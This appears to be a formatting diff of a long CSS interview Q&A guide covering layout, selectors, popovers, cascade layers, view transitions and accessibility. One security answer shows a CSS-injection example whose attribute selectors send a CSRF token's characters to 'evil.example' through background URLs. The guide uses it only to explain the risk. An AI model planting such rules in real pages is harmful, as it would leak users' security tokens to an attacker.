 `mix-blend-mode` blends an element with whatever is behind it. `background-blend-mode` blends an element's background layers with each other.
 
 ```css
-.title-on-image { mix-blend-mode: difference; color: white; }
+.title-on-image {
+  mix-blend-mode: difference;
+  color: white;
+}
 .duotone {
   background: url("photo.jpg"), #4f46e5;
   background-blend-mode: luminosity;
@@ -3607,8 +4154,15 @@ It creates a new stacking context and does nothing else visually. It's used to:
 - Contain `z-index` values inside a component, so a child with `z-index: 10` can't jump above other parts of the page.
 
 ```css
-.card { isolation: isolate; }
-.card::before { content: ""; position: absolute; inset: 0; z-index: -1; } /* stays behind the card's content, not behind the page */
+.card {
+  isolation: isolate;
+}
+.card::before {
+  content: "";
+  position: absolute;
+  inset: 0;
+  z-index: -1;
+} /* stays behind the card's content, not behind the page */
 ```
 
 ### 251: How do CSS counters work?
@@ -3616,14 +4170,19 @@ It creates a new stacking context and does nothing else visually. It's used to:
 Counters let CSS number things automatically.
 
 ```css
-article { counter-reset: section; }
+article {
+  counter-reset: section;
+}
 article h2::before {
   counter-increment: section;
   content: counter(section) ". ";
 }
 
 /* nested numbering like 1.1, 1.2 */
-ol { counter-reset: item; list-style: none; }
+ol {
+  counter-reset: item;
+  list-style: none;
+}
 ol li::before {
   counter-increment: item;
   content: counters(item, ".") " ";
@@ -3637,8 +4196,12 @@ ol li::before {
 It reads an HTML attribute and inserts its value as text.
 
 ```css
-a[href^="http"]::after { content: " (" attr(href) ")"; } /* print styles */
-[data-tooltip]:hover::after { content: attr(data-tooltip); }
+a[href^="http"]::after {
+  content: " (" attr(href) ")";
+} /* print styles */
+[data-tooltip]:hover::after {
+  content: attr(data-tooltip);
+}
 ```
 
 Traditionally it only works in `content` and only returns a string. Chromium now supports a typed `attr()` that works in any property, like `width: attr(data-width type(<length>))`, but it's not in all browsers yet.
@@ -3687,8 +4250,13 @@ input[type="checkbox"]:checked {
   background: #4f46e5;
   border-color: #4f46e5;
 }
-input[type="checkbox"]:checked::before { scale: 1; }
-input[type="checkbox"]:focus-visible { outline: 2px solid #4f46e5; outline-offset: 2px; }
+input[type="checkbox"]:checked::before {
+  scale: 1;
+}
+input[type="checkbox"]:focus-visible {
+  outline: 2px solid #4f46e5;
+  outline-offset: 2px;
+}
 ```
 
 If you only need a different color, `accent-color` is enough.
@@ -3717,7 +4285,9 @@ It matches an element if the element itself or anything inside it has focus.
   box-shadow: 0 0 0 3px rgb(79 70 229 / 25%);
 }
 
-.dropdown:focus-within .menu { display: block; } /* keeps the menu open for keyboard users */
+.dropdown:focus-within .menu {
+  display: block;
+} /* keeps the menu open for keyboard users */
 ```
 
 ### 257: How do you build a floating label with CSS only?
@@ -3726,18 +4296,22 @@ Use `:placeholder-shown`. The input needs a placeholder, which can be a single s
 
 ```html
 <div class="field">
-  <input id="email" placeholder=" ">
+  <input id="email" placeholder=" " />
   <label for="email">Email</label>
 </div>
 ```
 
 ```css
-.field { position: relative; }
+.field {
+  position: relative;
+}
 .field label {
   position: absolute;
   left: 0.75rem;
   top: 0.75rem;
-  transition: translate 150ms, scale 150ms;
+  transition:
+    translate 150ms,
+    scale 150ms;
   transform-origin: left top;
   pointer-events: none;
 }
@@ -3754,7 +4328,9 @@ Use `:placeholder-shown`. The input needs a placeholder, which can be a single s
 - `:target` matches the element whose `id` is in the URL hash.
 
 ```css
-.alert:empty { display: none; }
+.alert:empty {
+  display: none;
+}
 
 section:target {
   outline: 2px solid orange;
@@ -3768,10 +4344,14 @@ It counts only the siblings that match selector `S`.
 
 ```css
 /* zebra stripes for visible rows only */
-tr:nth-child(odd of :not(.hidden)) { background: #f5f5f5; }
+tr:nth-child(odd of :not(.hidden)) {
+  background: #f5f5f5;
+}
 
 /* the first 3 items with .featured */
-li:nth-child(-n + 3 of .featured) { font-weight: bold; }
+li:nth-child(-n + 3 of .featured) {
+  font-weight: bold;
+}
 ```
 
 This is different from `.featured:nth-child(-n + 3)`, which matches `.featured` items that are among the first three of all siblings. It's Baseline since 2023.
@@ -3805,11 +4385,18 @@ The `popover` attribute puts an element in the top layer when it opens. `:popove
   border: 1px solid #ddd;
   border-radius: 8px;
   opacity: 0;
-  transition: opacity 200ms, overlay 200ms allow-discrete, display 200ms allow-discrete;
+  transition:
+    opacity 200ms,
+    overlay 200ms allow-discrete,
+    display 200ms allow-discrete;
 }
-[popover]:popover-open { opacity: 1; }
+[popover]:popover-open {
+  opacity: 1;
+}
 @starting-style {
-  [popover]:popover-open { opacity: 0; }
+  [popover]:popover-open {
+    opacity: 0;
+  }
 }
 ```
 
@@ -3825,15 +4412,24 @@ dialog {
   max-width: min(90vw, 32rem);
   box-shadow: 0 20px 50px rgb(0 0 0 / 30%);
 }
-dialog::backdrop { background: rgb(0 0 0 / 40%); }
-dialog[open] { animation: pop 200ms ease-out; }
+dialog::backdrop {
+  background: rgb(0 0 0 / 40%);
+}
+dialog[open] {
+  animation: pop 200ms ease-out;
+}
 
 @keyframes pop {
-  from { opacity: 0; scale: 0.95; }
+  from {
+    opacity: 0;
+    scale: 0.95;
+  }
 }
 
 /* stop the page behind from scrolling */
-html:has(dialog[open]:modal) { overflow: hidden; }
+html:has(dialog[open]:modal) {
+  overflow: hidden;
+}
 ```
 
 `:modal` only matches dialogs opened with `showModal()`, not with `show()`.
@@ -3843,14 +4439,22 @@ html:has(dialog[open]:modal) { overflow: hidden; }
 ```css
 summary {
   cursor: pointer;
-  list-style: none;            /* hide the default triangle */
+  list-style: none; /* hide the default triangle */
 }
-summary::-webkit-details-marker { display: none; } /* older Safari */
+summary::-webkit-details-marker {
+  display: none;
+} /* older Safari */
 
-summary::after { content: "+"; float: right; }
-details[open] summary::after { content: "−"; }
+summary::after {
+  content: "+";
+  float: right;
+}
+details[open] summary::after {
+  content: "−";
+}
 
-details::details-content {   /* the content area, newer browsers */
+details::details-content {
+  /* the content area, newer browsers */
   padding-block: 0.5rem;
 }
 ```
@@ -3862,9 +4466,18 @@ details::details-content {   /* the content area, newer browsers */
 With `table-layout: fixed`, column widths come from the table's width and the first row (or `<col>` elements), not from all the content. The browser can lay out the table without reading every cell, which is faster for big tables. Column widths are also predictable and long content doesn't push columns wider.
 
 ```css
-table { table-layout: fixed; width: 100%; }
-th:nth-child(1) { width: 40%; }
-td { overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+table {
+  table-layout: fixed;
+  width: 100%;
+}
+th:nth-child(1) {
+  width: 40%;
+}
+td {
+  overflow: hidden;
+  text-overflow: ellipsis;
+  white-space: nowrap;
+}
 ```
 
 ### 265: How do you make text truncate inside a flex child?
@@ -3872,7 +4485,10 @@ td { overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
 The truncating element needs a width it can shrink to, and the flex item needs `min-width: 0`.
 
 ```css
-.row { display: flex; gap: 0.5rem; }
+.row {
+  display: flex;
+  gap: 0.5rem;
+}
 .row .name {
   flex: 1;
   min-width: 0;
@@ -3880,7 +4496,9 @@ The truncating element needs a width it can shrink to, and the flex item needs `
   overflow: hidden;
   text-overflow: ellipsis;
 }
-.row .actions { flex-shrink: 0; }
+.row .actions {
+  flex-shrink: 0;
+}
 ```
 
 Without `min-width: 0`, the text keeps the item at its full width and the ellipsis never shows.
@@ -3893,8 +4511,12 @@ Without `min-width: 0`, the text keeps the item at its full width and the ellips
   column-gap: 2rem;
   column-rule: 1px solid #ddd;
 }
-.article h2 { column-span: all; }
-.article figure { break-inside: avoid; }
+.article h2 {
+  column-span: all;
+}
+.article figure {
+  break-inside: avoid;
+}
 ```
 
 It flows content like a newspaper, top to bottom and then into the next column. It's good for text and simple masonry-style card lists. The reading order goes down each column, which can feel odd on long pages.
@@ -3910,8 +4532,12 @@ Fixes: use flexbox or grid for the parent (the best fix), remove the whitespace 
 Images are inline by default, so they sit on the text baseline. The space under them is room left for letters that hang below the line, like "g" and "p".
 
 ```css
-img { display: block; }        /* most common fix */
-img { vertical-align: middle; } /* if it must stay inline */
+img {
+  display: block;
+} /* most common fix */
+img {
+  vertical-align: middle;
+} /* if it must stay inline */
 ```
 
 ### 269: Do margins collapse inside flex and grid containers?
@@ -3926,7 +4552,9 @@ No. Margins of flex items and grid items never collapse, either with each other 
 - A negative bottom or right margin pulls the following content closer.
 
 ```css
-.avatars img + img { margin-left: -12px; }
+.avatars img + img {
+  margin-left: -12px;
+}
 ```
 
 They're valid CSS, but `gap`, grid and `translate` are often clearer.
@@ -3952,9 +4580,15 @@ Today you'd use `aspect-ratio: 16 / 9` instead.
 - `fit-content`: `max-content`, but no bigger than the available space. It's `min(max-content, max(min-content, available))`.
 
 ```css
-.tag { width: fit-content; }               /* block that shrinks to its text */
-.grid { grid-template-columns: max-content 1fr; } /* label column as wide as the longest label */
-figure { width: min-content; }             /* caption wraps to the image width */
+.tag {
+  width: fit-content;
+} /* block that shrinks to its text */
+.grid {
+  grid-template-columns: max-content 1fr;
+} /* label column as wide as the longest label */
+figure {
+  width: min-content;
+} /* caption wraps to the image width */
 ```
 
 ### 273: What is the difference between `overflow: hidden` and `overflow: clip`?
@@ -3974,7 +4608,9 @@ Both break long words that don't fit. The difference is in **min-content sizing*
 - `anywhere`: the possible breaks do count, so the container can shrink and the word breaks.
 
 ```css
-.comment { overflow-wrap: anywhere; }
+.comment {
+  overflow-wrap: anywhere;
+}
 ```
 
 ### 275: How do you style SVG icons with CSS?
@@ -3985,11 +4621,13 @@ Inline SVG (or SVG used with `<use>`) can be styled like HTML.
 .icon {
   width: 1.25em;
   height: 1.25em;
-  fill: currentColor;   /* matches the text color */
+  fill: currentColor; /* matches the text color */
   stroke: none;
   vertical-align: -0.2em;
 }
-.button:hover .icon { fill: #4f46e5; }
+.button:hover .icon {
+  fill: #4f46e5;
+}
 ```
 
 SVG used as `<img>` or `background-image` can't be styled from the page. Use a CSS `mask` with `currentColor` if you need to color those.
@@ -4000,14 +4638,21 @@ Default to the OS setting, and let a class or attribute override it. With `light
 
 ```css
 :root {
-  color-scheme: light dark;   /* follow the OS by default */
+  color-scheme: light dark; /* follow the OS by default */
   --bg: light-dark(#fff, #111);
   --text: light-dark(#111, #eee);
 }
-:root[data-theme="light"] { color-scheme: light; }
-:root[data-theme="dark"] { color-scheme: dark; }
+:root[data-theme="light"] {
+  color-scheme: light;
+}
+:root[data-theme="dark"] {
+  color-scheme: dark;
+}
 
-body { background: var(--bg); color: var(--text); }
+body {
+  background: var(--bg);
+  color: var(--text);
+}
 ```
 
 ```js
@@ -4024,10 +4669,12 @@ It tells you whether the user asked the OS for more (or less) contrast.
 ```css
 @media (prefers-contrast: more) {
   :root {
-    --text-muted: #333;   /* instead of a light gray */
+    --text-muted: #333; /* instead of a light gray */
     --border: #000;
   }
-  .button { border: 2px solid; }
+  .button {
+    border: 2px solid;
+  }
 }
 ```
 
@@ -4040,10 +4687,22 @@ It's different from `forced-colors`. With `prefers-contrast`, your colors are st
   size: A4;
   margin: 2cm;
 }
-h2, h3 { break-after: avoid; }       /* don't leave a heading alone at the bottom */
-figure, table, pre { break-inside: avoid; }
-.chapter { break-before: page; }
-p { orphans: 3; widows: 3; }
+h2,
+h3 {
+  break-after: avoid;
+} /* don't leave a heading alone at the bottom */
+figure,
+table,
+pre {
+  break-inside: avoid;
+}
+.chapter {
+  break-before: page;
+}
+p {
+  orphans: 3;
+  widows: 3;
+}
 ```
 
 The older names `page-break-before`, `page-break-after` and `page-break-inside` still work as aliases.
@@ -4070,7 +4729,9 @@ The older names `page-break-before`, `page-break-after` and `page-break-inside` 
   all: unset;
   cursor: pointer;
 }
-.reset-button:focus-visible { outline: 2px solid; } /* add focus back */
+.reset-button:focus-visible {
+  outline: 2px solid;
+} /* add focus back */
 ```
 
 ### 281: What does `revert-layer` do?
@@ -4081,11 +4742,17 @@ It rolls a property back to the value it would have from the previous cascade la
 @layer base, theme;
 
 @layer base {
-  a { color: blue; }
+  a {
+    color: blue;
+  }
 }
 @layer theme {
-  a { color: purple; }
-  .nav a { color: revert-layer; } /* back to blue from base */
+  a {
+    color: purple;
+  }
+  .nav a {
+    color: revert-layer;
+  } /* back to blue from base */
 }
 ```
 
@@ -4104,7 +4771,9 @@ It's useful in theme or component layers when you want "whatever the layer below
 - Add a temporary outline to everything to see boxes without changing layout:
 
 ```css
-* { outline: 1px solid rgb(255 0 0 / 30%); }
+* {
+  outline: 1px solid rgb(255 0 0 / 30%);
+}
 ```
 
 - Use the flexbox and grid overlays in DevTools, which show tracks, gaps and line numbers.
@@ -4122,7 +4791,9 @@ It's useful in theme or component layers when you want "whatever the layer below
   padding: var(--button-padding, 0.5rem 1rem);
 }
 
-.hero .button { --button-bg: white; }
+.hero .button {
+  --button-bg: white;
+}
 ```
 
 The component exposes `--button-*` variables. Then it falls back to theme tokens, then to a hard-coded value. Note that the fallback can contain commas: everything after the first comma is the fallback.
@@ -4130,15 +4801,54 @@ The component exposes `--button-*` variables. Then it falls back to theme tokens
 ### 285: What goes into a modern CSS reset?
 
 ```css
-*, *::before, *::after { box-sizing: border-box; }
-* { margin: 0; }
-html { -webkit-text-size-adjust: none; text-size-adjust: none; }
-body { line-height: 1.5; -webkit-font-smoothing: antialiased; }
-img, picture, video, canvas, svg { display: block; max-width: 100%; }
-input, button, textarea, select { font: inherit; }
-p, h1, h2, h3, h4, h5, h6 { overflow-wrap: break-word; }
-h1, h2, h3 { text-wrap: balance; }
-#root, #__next { isolation: isolate; }
+*,
+*::before,
+*::after {
+  box-sizing: border-box;
+}
+* {
+  margin: 0;
+}
+html {
+  -webkit-text-size-adjust: none;
+  text-size-adjust: none;
+}
+body {
+  line-height: 1.5;
+  -webkit-font-smoothing: antialiased;
+}
+img,
+picture,
+video,
+canvas,
+svg {
+  display: block;
+  max-width: 100%;
+}
+input,
+button,
+textarea,
+select {
+  font: inherit;
+}
+p,
+h1,
+h2,
+h3,
+h4,
+h5,
+h6 {
+  overflow-wrap: break-word;
+}
+h1,
+h2,
+h3 {
+  text-wrap: balance;
+}
+#root,
+#__next {
+  isolation: isolate;
+}
 ```
 
 Each line fixes a real annoyance: the box model, default margins, images overflowing, form controls ignoring fonts, long words overflowing, and app root stacking.
@@ -4155,7 +4865,10 @@ Keep a small named scale in one place instead of random numbers:
   --z-modal: 400;
   --z-toast: 500;
 }
-.header { position: sticky; z-index: var(--z-sticky); }
+.header {
+  position: sticky;
+  z-index: var(--z-sticky);
+}
 ```
 
 Use `isolation: isolate` on components so their inner `z-index` values stay local. Use the top layer (`<dialog>`, `popover`) for modals and popups, which removes most of the need for high `z-index` values.
@@ -4163,7 +4876,9 @@ Use `isolation: isolate` on components so their inner `z-index` values stay loca
 ### 287: How do you center an absolutely positioned element?
 
 ```css
-.parent { position: relative; }
+.parent {
+  position: relative;
+}
 
 /* modern */
 .child {
@@ -4202,7 +4917,10 @@ Apply this to the `<iframe>` directly. For `<video>`, use `width: 100%; height: 
 `env()` reads values from the browser or device. The main use is `safe-area-inset-*` for phones with notches and home indicators.
 
 ```html
-<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta
+  name="viewport"
+  content="width=device-width, initial-scale=1, viewport-fit=cover"
+/>
 ```
 
 ```css
@@ -4220,9 +4938,15 @@ Without `viewport-fit=cover`, the page doesn't go into the unsafe areas, and the
 It tells the browser which touch gestures it should handle itself, like scrolling and pinch-zoom, so your JavaScript can handle the rest.
 
 ```css
-.map { touch-action: none; }           /* JS handles all gestures */
-.carousel { touch-action: pan-y; }     /* browser scrolls vertically, JS handles horizontal swipe */
-button { touch-action: manipulation; } /* no double-tap zoom */
+.map {
+  touch-action: none;
+} /* JS handles all gestures */
+.carousel {
+  touch-action: pan-y;
+} /* browser scrolls vertically, JS handles horizontal swipe */
+button {
+  touch-action: manipulation;
+} /* no double-tap zoom */
 ```
 
 ### 291: What does `user-select` do?
@@ -4230,8 +4954,13 @@ button { touch-action: manipulation; } /* no double-tap zoom */
 It controls whether the user can select text.
 
 ```css
-.button, .tab { user-select: none; }  /* no accidental selection on double-click */
-.code-snippet { user-select: all; }   /* one click selects everything */
+.button,
+.tab {
+  user-select: none;
+} /* no accidental selection on double-click */
+.code-snippet {
+  user-select: all;
+} /* one click selects everything */
 ```
 
 Don't disable selection on content people may want to copy. Safari still needs `-webkit-user-select` in some versions.
@@ -4271,8 +5000,12 @@ The grid version, with named lines:
     [content-start] minmax(0, 65ch) [content-end]
     minmax(1rem, 1fr) [full-end];
 }
-.layout > * { grid-column: content; }
-.layout > .full-bleed { grid-column: full; }
+.layout > * {
+  grid-column: content;
+}
+.layout > .full-bleed {
+  grid-column: full;
+}
 ```
 
 A quick version with no grid:
@@ -4309,8 +5042,13 @@ The second version can cause a horizontal scrollbar on desktop, because `100vw` 
 This comes for free in flexbox and grid. Items stretch to the height of the row by default (`align-items: stretch`).
 
 ```css
-.columns { display: flex; gap: 1rem; }
-.columns > * { flex: 1; }
+.columns {
+  display: flex;
+  gap: 1rem;
+}
+.columns > * {
+  flex: 1;
+}
 ```
 
 To make the parts inside each card line up too (like titles and buttons), use `subgrid` or make each card a column flexbox with `margin-top: auto` on the footer.
@@ -4327,7 +5065,9 @@ To make the parts inside each card line up too (like titles and buttons), use `s
   color: #fff;
   z-index: 1000;
 }
-.skip-link:focus { top: 1rem; }
+.skip-link:focus {
+  top: 1rem;
+}
 ```
 
 ```html
@@ -4343,7 +5083,9 @@ Combine `:nth-child` and `:nth-last-child` (quantity queries), or use `:has()`.
 ```css
 /* exactly 3 items */
 li:first-child:nth-last-child(3),
-li:first-child:nth-last-child(3) ~ li { width: 33%; }
+li:first-child:nth-last-child(3) ~ li {
+  width: 33%;
+}
 
 /* grid with 5 or more items gets more columns */
 .grid:has(> :nth-child(5)) {
@@ -4365,7 +5107,9 @@ a {
   text-decoration-color: rgb(79 70 229 / 40%);
   transition: text-decoration-color 150ms;
 }
-a:hover { text-decoration-color: currentColor; }
+a:hover {
+  text-decoration-color: currentColor;
+}
 ```
 
 `text-decoration-skip-ink: auto` (the default) breaks the line around letters that go below it, like "g" and "y".
@@ -4454,7 +5198,9 @@ The cost: each layer uses memory (width × height × 4 bytes, times the device p
 - `content` = `layout paint style`. `strict` = `size layout paint style`.
 
 ```css
-.widget { contain: content; }
+.widget {
+  contain: content;
+}
 ```
 
 It's most useful for widgets that update often, like chat lists and dashboards, because a change inside doesn't make the browser recalculate the whole page.
@@ -4480,10 +5226,17 @@ Critical CSS is the small part of your styles needed to render the above-the-fol
 
 ```html
 <head>
-  <style>/* critical rules: header, hero, layout */</style>
-  <link rel="preload" href="/main.css" as="style">
-  <link rel="stylesheet" href="/main.css" media="print" onload="this.media='all'">
-  <noscript><link rel="stylesheet" href="/main.css"></noscript>
+  <style>
+    /* critical rules: header, hero, layout */
+  </style>
+  <link rel="preload" href="/main.css" as="style" />
+  <link
+    rel="stylesheet"
+    href="/main.css"
+    media="print"
+    onload="this.media='all'"
+  />
+  <noscript><link rel="stylesheet" href="/main.css" /></noscript>
 </head>
 ```
 
@@ -4494,7 +5247,12 @@ The first paint happens with no extra request. The cost is the build complexity 
 A stylesheet with a media query that doesn't match is downloaded at low priority and doesn't block rendering. When it has loaded, the `onload` handler switches `media` to `all`, and the styles apply.
 
 ```html
-<link rel="stylesheet" href="non-critical.css" media="print" onload="this.media='all'">
+<link
+  rel="stylesheet"
+  href="non-critical.css"
+  media="print"
+  onload="this.media='all'"
+/>
 ```
 
 The `<noscript>` fallback is needed for users with JavaScript turned off. A strict Content Security Policy that blocks inline event handlers will block this `onload`, so you may need a small external script instead.
@@ -4581,8 +5339,12 @@ They connect a CSS animation to scroll position instead of time, with no JavaScr
   animation-timeline: scroll(root block);
 }
 @keyframes grow {
-  from { scale: 0 1; }
-  to   { scale: 1 1; }
+  from {
+    scale: 0 1;
+  }
+  to {
+    scale: 1 1;
+  }
 }
 ```
 
@@ -4599,8 +5361,14 @@ They connect a CSS animation to scroll position instead of time, with no JavaScr
   animation-range: entry 0% cover 30%;
 }
 @keyframes fade-up {
-  from { opacity: 0; translate: 0 2rem; }
-  to   { opacity: 1; translate: 0 0; }
+  from {
+    opacity: 0;
+    translate: 0 2rem;
+  }
+  to {
+    opacity: 1;
+    translate: 0 0;
+  }
 }
 ```
 
@@ -4631,9 +5399,13 @@ Same-document view transitions are Baseline since late 2025. React, Next.js, Ast
 Elements with a unique `view-transition-name` are captured on their own, and the browser animates their position and size between the old and new states. That's how you get "shared element" transitions, like a thumbnail growing into a hero image.
 
 ```css
-.product-thumb { view-transition-name: product-42; }
+.product-thumb {
+  view-transition-name: product-42;
+}
 /* on the next page or state: */
-.product-hero { view-transition-name: product-42; }
+.product-hero {
+  view-transition-name: product-42;
+}
 ```
 
 During the transition the browser builds this tree in the top layer:
@@ -4673,8 +5445,12 @@ document.startViewTransition({
 
 ```css
 html:active-view-transition-type(slide-left) {
-  &::view-transition-old(root) { animation: slide-out-left 300ms; }
-  &::view-transition-new(root) { animation: slide-in-right 300ms; }
+  &::view-transition-old(root) {
+    animation: slide-out-left 300ms;
+  }
+  &::view-transition-new(root) {
+    animation: slide-in-right 300ms;
+  }
 }
 ```
 
@@ -4716,7 +5492,9 @@ If the positioned element would overflow the viewport, the browser can try other
   position-area: right;
   margin-left: 8px;
 }
-.tooltip { position-try-fallbacks: flip-block, --right-side; }
+.tooltip {
+  position-try-fallbacks: flip-block, --right-side;
+}
 ```
 
 `flip-block` and `flip-inline` mirror the position. `position-try-order: most-height` picks the option with the most room. `position-visibility: anchors-hidden` hides the element when its anchor scrolls out of view.
@@ -4731,7 +5509,7 @@ If the positioned element would overflow the viewport, the browser can try other
   position-area: bottom span-right; /* below, starting at the anchor's left edge */
 }
 .dropdown {
-  width: anchor-size(width);        /* as wide as the button */
+  width: anchor-size(width); /* as wide as the button */
   min-width: max-content;
 }
 ```
@@ -4751,7 +5529,7 @@ If the positioned element would overflow the viewport, the browser can try other
   position-area: top;
   position-try-fallbacks: flip-block;
   margin: 0 0 6px;
-  inset: auto;   /* clear the default popover centering */
+  inset: auto; /* clear the default popover centering */
 }
 ```
 
@@ -4770,7 +5548,9 @@ select,
   border-radius: 8px;
   box-shadow: 0 8px 24px rgb(0 0 0 / 15%);
 }
-option:checked { font-weight: bold; }
+option:checked {
+  font-weight: bold;
+}
 ```
 
 Browsers that don't support it show the normal native select, so it's safe to add now. The dropdown uses the top layer and anchor positioning internally.
@@ -4782,9 +5562,8 @@ Browsers that don't support it show the normal native select, so it's safe to ad
 ```css
 .button {
   background: if(
-    style(--variant: danger): crimson;
-    style(--variant: ghost): transparent;
-    else: royalblue
+    style(--variant: danger): crimson; style(--variant: ghost): transparent;
+      else: royalblue
   );
   padding: if(media(width < 600px): 0.5rem; else: 1rem);
 }
@@ -4798,7 +5577,9 @@ They return an element's position among its siblings and the total number of sib
 
 ```css
 .list > li {
-  transition-delay: calc((sibling-index() - 1) * 50ms); /* staggered animation */
+  transition-delay: calc(
+    (sibling-index() - 1) * 50ms
+  ); /* staggered animation */
 }
 .fan > .card {
   rotate: calc((sibling-index() - (sibling-count() + 1) / 2) * 5deg);
@@ -4835,7 +5616,9 @@ The second argument is a fallback. It's in Chromium (since 133) and is an Intero
   result: clamp(var(--min), calc(var(--min) + 2vw), var(--max));
 }
 
-h1 { font-size: --fluid(2rem, 3.5rem); }
+h1 {
+  font-size: --fluid(2rem, 3.5rem);
+}
 ```
 
 It's very new: only in Chromium so far. For production code, Sass functions or plain `clamp()` are still the safe choice.
@@ -4845,12 +5628,22 @@ It's very new: only in Chromium so far. For production code, Sass functions or p
 They let you do math with and animate to intrinsic sizes like `auto`, `min-content` and `fit-content`.
 
 ```css
-:root { interpolate-size: allow-keywords; } /* opt in once for the page */
+:root {
+  interpolate-size: allow-keywords;
+} /* opt in once for the page */
 
-.panel { height: 0; overflow: clip; transition: height 300ms; }
-.panel.open { height: auto; }
+.panel {
+  height: 0;
+  overflow: clip;
+  transition: height 300ms;
+}
+.panel.open {
+  height: auto;
+}
 
-.drawer.open { height: calc-size(auto, size + 2rem); }
+.drawer.open {
+  height: calc-size(auto, size + 2rem);
+}
 ```
 
 `interpolate-size` is opt-in because it could change the behavior of existing sites. Both are Chromium-only for now. Other browsers just jump to the final size.
@@ -4870,7 +5663,9 @@ They let you do math with and animate to intrinsic sizes like `auto`, `min-conte
 }
 
 /* snap a fluid size to a 4px grid */
-.box { width: round(nearest, 33vw, 4px); }
+.box {
+  width: round(nearest, 33vw, 4px);
+}
 ```
 
 Trig and rounding functions are Baseline (2023-2024).
@@ -4918,8 +5713,16 @@ Declare the order in one statement that loads first. Keep unlayered CSS to a min
 When two declarations come from scoped rules with the same specificity and the same layer, the one whose scope root is **closer** in the DOM wins, no matter the source order.
 
 ```css
-@scope (.light) { p { color: black; } }
-@scope (.dark)  { p { color: white; } }
+@scope (.light) {
+  p {
+    color: black;
+  }
+}
+@scope (.dark) {
+  p {
+    color: white;
+  }
+}
 ```
 
 ```html
@@ -4938,8 +5741,12 @@ A donut scope styles a component but stops at certain inner parts, like slots wh
 
 ```css
 @scope (.card) to (.card__content) {
-  a { color: var(--card-link); }
-  img { border-radius: 8px; }
+  a {
+    color: var(--card-link);
+  }
+  img {
+    border-radius: 8px;
+  }
 }
 ```
 
@@ -5234,7 +6041,8 @@ Fix it with `vertical-align: top` on the inline-blocks, or better, switch to fle
 Fonts add extra space above capital letters and below the baseline, so text inside a button never looks quite centered, and spacing between headings and boxes looks uneven. `text-box` trims that space to the actual letter edges.
 
 ```css
-.button, h1 {
+.button,
+h1 {
   text-box: trim-both cap alphabetic;
 }
 ```
@@ -5262,10 +6070,14 @@ Fixes: use grid or flex `gap` instead of percentage widths, avoid centering with
 `1px` in CSS is several device pixels on a retina screen. For a single-device-pixel line:
 
 ```css
-.hairline { border-bottom: 1px solid #ddd; }
+.hairline {
+  border-bottom: 1px solid #ddd;
+}
 
 @media (min-resolution: 2dppx) {
-  .hairline { border-bottom-width: 0.5px; }
+  .hairline {
+    border-bottom-width: 0.5px;
+  }
 }
 ```
 
@@ -5292,9 +6104,15 @@ Today it's legacy. Use `will-change: transform` if you really need early promoti
 Gradients and `color-mix()` blend colors in a color space. The default for gradients is sRGB, which can make a muddy gray band in the middle, for example between blue and yellow. You can choose another space:
 
 ```css
-.a { background: linear-gradient(in oklch, blue, yellow); }
-.b { background: linear-gradient(in oklch longer hue, red, red); } /* rainbow */
-.c { background: linear-gradient(in srgb-linear, black, white); }
+.a {
+  background: linear-gradient(in oklch, blue, yellow);
+}
+.b {
+  background: linear-gradient(in oklch longer hue, red, red);
+} /* rainbow */
+.c {
+  background: linear-gradient(in srgb-linear, black, white);
+}
 ```
 
 `oklab` and `oklch` give smooth and bright blends. The hue options (`shorter`, `longer`, `increasing`, `decreasing`) set which way around the color wheel the hue goes.
@@ -5311,11 +6129,22 @@ In forced colors mode, the browser replaces colors with **system colors**: `Canv
 
 ```css
 @media (forced-colors: active) {
-  .card { border: 1px solid CanvasText; }       /* keep edges */
-  .badge { forced-color-adjust: none; }          /* keep brand color, check contrast yourself */
-  .icon { fill: CanvasText; }                    /* SVG that uses fixed colors */
-  .button:focus-visible { outline: 2px solid Highlight; }
-  .selected { background: Highlight; color: HighlightText; }
+  .card {
+    border: 1px solid CanvasText;
+  } /* keep edges */
+  .badge {
+    forced-color-adjust: none;
+  } /* keep brand color, check contrast yourself */
+  .icon {
+    fill: CanvasText;
+  } /* SVG that uses fixed colors */
+  .button:focus-visible {
+    outline: 2px solid Highlight;
+  }
+  .selected {
+    background: Highlight;
+    color: HighlightText;
+  }
 }
 ```
 
@@ -5323,15 +6152,15 @@ Things to know: `box-shadow` and background images that carry meaning are remove
 
 ### 377: What is the accessibility impact of different ways of hiding content?
 
-| Method | Visible | In accessibility tree | Focusable |
-|---|---|---|---|
-| `display: none` / `hidden` attribute | No | No | No |
-| `visibility: hidden` | No | No | No |
-| `.sr-only` (clip pattern) | No | Yes | Yes |
-| `opacity: 0` | No | Yes | Yes |
-| `inert` attribute | Yes | No | No |
-| `content-visibility: hidden` | No | No | No |
-| `content-visibility: auto` (off-screen) | Skipped for render | Yes | Yes |
+| Method                                  | Visible            | In accessibility tree | Focusable |
+| --------------------------------------- | ------------------ | --------------------- | --------- |
+| `display: none` / `hidden` attribute    | No                 | No                    | No        |
+| `visibility: hidden`                    | No                 | No                    | No        |
+| `.sr-only` (clip pattern)               | No                 | Yes                   | Yes       |
+| `opacity: 0`                            | No                 | Yes                   | Yes       |
+| `inert` attribute                       | Yes                | No                    | No        |
+| `content-visibility: hidden`            | No                 | No                    | No        |
+| `content-visibility: auto` (off-screen) | Skipped for render | Yes                   | Yes       |
 
 A common bug is `opacity: 0` on closed menus. Screen reader and keyboard users can still reach invisible links. Pair it with `visibility: hidden` (which can be transitioned) or use `inert`.
 
@@ -5396,8 +6225,12 @@ Scroll-driven animations need the same treatment, because motion tied to scrolli
 If an attacker can inject CSS (but not JavaScript) into a page, they can still leak data with attribute selectors and background requests:
 
 ```css
-input[name="csrf"][value^="a"] { background: url("https://evil.example/?c=a"); }
-input[name="csrf"][value^="b"] { background: url("https://evil.example/?c=b"); }
+input[name="csrf"][value^="a"] {
+  background: url("https://evil.example/?c=a");
+}
+input[name="csrf"][value^="b"] {
+  background: url("https://evil.example/?c=b");
+}
 /* ...one rule per character, repeated for each position */
 ```
 
@@ -5461,10 +6294,12 @@ A third-party stylesheet can:
 Self-host when you can. If you load from a CDN, use Subresource Integrity:
 
 ```html
-<link rel="stylesheet"
-      href="https://cdn.example.com/lib@1.2.3/lib.min.css"
-      integrity="sha384-..."
-      crossorigin="anonymous">
+<link
+  rel="stylesheet"
+  href="https://cdn.example.com/lib@1.2.3/lib.min.css"
+  integrity="sha384-..."
+  crossorigin="anonymous"
+/>
 ```
 
 Also pin exact versions and put vendor CSS in a low-priority cascade layer.
